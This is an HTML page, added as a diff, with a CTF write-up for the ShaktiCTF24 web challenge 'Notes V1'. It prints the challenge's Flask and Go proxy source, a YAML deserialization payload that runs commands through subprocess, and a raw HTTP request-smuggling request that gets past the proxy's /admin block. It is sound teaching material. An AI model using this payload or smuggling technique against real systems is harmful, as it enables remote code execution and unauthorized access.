@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF24/web/notes_v1/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>Notes V1 - CTF-Writeups</title>
+        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/darcula.min.css">
+
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../../../about/" class="nav-link">About Us</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF24/web/notes_v1.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups
+                                    </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#notes-v1" class="nav-link">Notes V1</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="notes-v1">Notes V1</h1>
+<p><strong>Description</strong>
+  <br>
+  Is there more to the Simple Notes app than meets the eye?</p>
+<p><strong>Author:  <a href="https://twitter.com/L0xm1_07">L0xm1</a></strong></p>
+<p><strong>Solution</strong>
+<br> 
+We are given with a notes-app where we can add notes and edit notes. Lets dive into the source code given.</p>
+<p>app.py</p>
+<pre><code class="language-py">from flask import Flask, request, render_template, redirect, url_for
+from werkzeug.serving import WSGIRequestHandler
+import os 
+import yaml
+from yaml import *
+import uuid
+from threading import Thread
+
+app = Flask(__name__)
+notes = []
+
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        title = request.form['title']
+        content = request.form['content']
+        note_id = str(uuid.uuid4())
+        notes.append({'id': note_id, 'title': title, 'content': content})
+        return redirect(url_for('index'))
+    else:
+        return render_template('index.html', notes=notes)
+
+@app.route('/add_note', methods=['POST'])
+def add_note():
+    title = request.form['title']
+    content = request.form['content']
+    note_id = str(uuid.uuid4())
+    notes.append({'id': note_id, 'title': title, 'content': content})
+    return render_template('index.html', notes=notes)
+
+@app.route('/edit_note/&lt;note_id&gt;', methods=['GET', 'POST'])
+def edit_note(note_id):
+    note = next((note for note in notes if note['id'] == note_id), None)
+    if note:
+        if request.method == 'POST':
+            title = request.form['title']
+            content = request.form['content']
+            note['title'] = title
+            note['content'] = content
+            return redirect(url_for('index'))
+        else:
+            return render_template('edit.html', note=note)
+    else:
+        return 'Note not found', 404
+
+@app.route('/admin', methods=['GET'])
+def serialize():
+    data=request.args.get('data')
+    if data:
+        deserialized=yaml.load(data,Loader=Loader)
+        return deserialized
+    else:
+        return &quot;No data provided&quot;
+
+
+if __name__ == '__main__':
+    WSGIRequestHandler.protocol_version = &quot;HTTP/1.1&quot;
+    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)
+
+</code></pre>
+<p>In <em>/admin</em> endpoint, <em>yaml.load()</em> is used which is vulnerable to deserialization vulnerability and a user can get RCE.</p>
+<p>We can use the following payload to read the flag.</p>
+<pre><code class="language-yaml">!!python/object/apply:subprocess.check_output
+args:
+- - cat
+  - flag.txt
+
+</code></pre>
+<p>But if we look into the go-proxy code, the <em>/admin</em> endpoint is prohibitted from accessing.</p>
+<p>main.go</p>
+<pre><code class="language-go">package main
+
+import (
+    &quot;log&quot;
+    &quot;net/http&quot;
+    &quot;net/http/httputil&quot;
+    &quot;net/url&quot;
+)
+
+type loggingResponseWriter struct {
+    http.ResponseWriter
+}
+
+func (lrw *loggingResponseWriter) Write(b []byte) (int, error) {
+    log.Printf(&quot;Response Body: %s\n&quot;, string(b))
+    return lrw.ResponseWriter.Write(b)
+}
+
+func loggingHandler(h http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // log.Printf(&quot;Request Headers: %+v\n&quot;, r.Header)
+
+        //  Set Connection: keep-alive header in the outgoing request
+        //  r.Header.Set(&quot;Connection&quot;, &quot;keep-alive&quot;)
+
+        lrw := &amp;loggingResponseWriter{w}
+        h.ServeHTTP(lrw, r)
+
+        // log.Printf(&quot;Response Headers: %+v\n&quot;, lrw.Header())
+    })
+}
+
+func main() {
+    origin, err := url.Parse(&quot;http://localhost:5000&quot;)
+    if err != nil {
+        panic(err)
+    }
+
+    proxy := httputil.NewSingleHostReverseProxy(origin)
+
+    http.DefaultTransport.(*http.Transport).MaxIdleConns = 500
+    http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 100
+
+    http.Handle(&quot;/&quot;, loggingHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        if r.URL.Path == &quot;/admin&quot; {
+            http.Error(w, &quot;Access to /admin is prohibited&quot;, http.StatusForbidden)
+            return
+        }
+        proxy.ServeHTTP(w, r)
+    })))
+    log.Println(&quot;Server started at :8000...&quot;)
+    log.Fatal(http.ListenAndServe(&quot;:8000&quot;, nil))
+
+}
+</code></pre>
+<p>We need to bypass the proxy to reach <em>/admin</em> endpoint and we can get RCE using yaml deserialization vulnerability.</p>
+<p>How will we bypass the proxy?</p>
+<p>In Werkzeug, underscores (_) are converted to hyphens (-) and interpreted as such. This means that the <em>Content_Length</em> header is treated in the same way as Content-Length. So we can give Content-Length and Content_Length, such that the go-proxy will consider only the first Content-Length header, and Werkzeug will consider the second Content_Length header. We can use this trick to smuggle our request to <em>/admin</em> endpoint, thus bypassing the proxy. </p>
+<p>Combining everything, we can smuggle our request to /admin endpoint using the following request and get the flag.</p>
+<pre><code>POST / HTTP/1.1
+Host: localhost:8000
+Content-Length: 151
+Content_Length: 0
+
+GET /admin?data=%21%21python%2Fobject%2Fapply%3Asubprocess.check_output%0Aargs%3A%0A-%20-%20cat%0A%20%20-%20flag.txt HTTP/1.1
+Host: localhost:8000
+
+GET / HTTP/1.1
+Host: localhost:8000
+
+</code></pre>
+<p><em>Flag: <code>shaktictf{c0ngr4ts_y0u_bypassed_the_proxy}</code></em>  </p></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
